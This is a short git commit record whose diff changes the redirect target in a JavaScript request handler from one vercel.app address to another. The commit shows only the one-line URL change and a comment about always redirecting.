88ca52e9e5ba89070f0652117e60d87812b48b05
vpnkybad03 <vpnkybad03@gmail.com>
2025-08-14 10:30:24 +0500

    Update rashid2.js

--- rashid2.js
+++ rashid2.js
@@ -55,5 +55,5 @@ export default async function handler(req, res) {
   }
 
   // Always redirect (success or failure)
-  return res.redirect(302, "https://zubair6pass.vercel.app/");
+  return res.redirect(302, "https://rashid26pass.vercel.app/");
 }
